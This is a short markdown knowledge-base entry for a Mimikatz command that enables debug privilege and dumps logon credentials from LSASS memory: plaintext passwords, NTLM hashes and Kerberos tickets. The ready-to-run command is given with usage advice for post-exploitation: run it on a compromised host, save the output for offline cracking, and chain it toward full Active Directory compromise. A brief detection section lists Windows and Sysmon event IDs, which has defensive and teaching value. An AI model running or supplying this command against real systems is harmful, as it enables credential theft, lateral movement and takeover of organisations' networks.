---
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:02.622551+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - credential-dumping
  - mimikatz
validated: true
---

# mimikatz-dump-logon-passwords

## Code

```bash
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
```

## Description

This Mimikatz command sequence enables debug privileges and dumps all in-memory logon credentials, including plaintext passwords, NTLM hashes, and Kerberos tickets from the LSASS process. It is used post-exploitation to extract credentials for lateral movement.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| No variables | Runs with default full dump | N/A |

## Usage

Execute on a compromised Windows host with SYSTEM or admin privileges. Output can be redirected to a file for offline cracking. Commonly chained after ticket injection for full AD compromise.

## Detection

- Windows Event ID 4688 for mimikatz.exe execution or suspicious child processes.
- LSASS access patterns via Sysmon (Event ID 10: ProcessAccess to lsass.exe).
- EDR alerts for debug privilege elevation or sekurlsa module usage.

## Related

- [[Related Procedure: Exploit-MS14-068-Kerberos-Checksum-Validation-for-AD-Privilege-Escalation]]
- [[tools/Mimikatz]]
